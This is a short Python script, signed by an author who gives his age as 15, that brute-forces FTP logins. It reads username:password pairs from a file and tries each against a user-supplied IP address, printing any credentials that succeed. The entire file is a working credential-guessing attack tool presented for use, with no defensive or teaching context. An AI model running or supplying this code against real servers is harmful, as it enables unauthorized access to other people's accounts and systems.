#!/usr/bin/python3

import ftplib

def bruteLogin(hostname,passwdFile):
	try:	pF=open(passwdFile,"r")
	except:	print("[!!] File doesn't exist!")
	for line in pF.readlines():
		try:
			userName=line.split(":")[0]
			passWord=line.split(":")[1].strip("\n")
			print("[+] Trying: %s:%s"%(userName,passWord))
			ftp=ftplib.FTP(hostname)
			login=ftp.login(userName,passWord)
			print("[+] Login successed with: %s:%s"%(userName,passWord))
			ftp.quit()
			print("\n","\t"*2,"#"*75,"\n")
		except:	pass
	print("[-] Username:Password not found!"),print("\n","\t"*2,"#"*75,"\n")

print("\n","\t"*5,"===>    Simple FTP Brute-force    <===","\n"),print("\t"*4,"By : Abd Almoen Arafa (0.1Arafa)"),print("\t"*4,"Age : 15\n"),print("\t"*2,"#"*75,"\n")
host=input("[*] Enter The IP address: ")
passwdFile=input("[*] Enter File, The File must contain like this, Username:Password (admin:admin): ")
bruteLogin(host,passwdFile)
#By : Abd Almoen Arafa (0.1Arafa)
#Age : 15
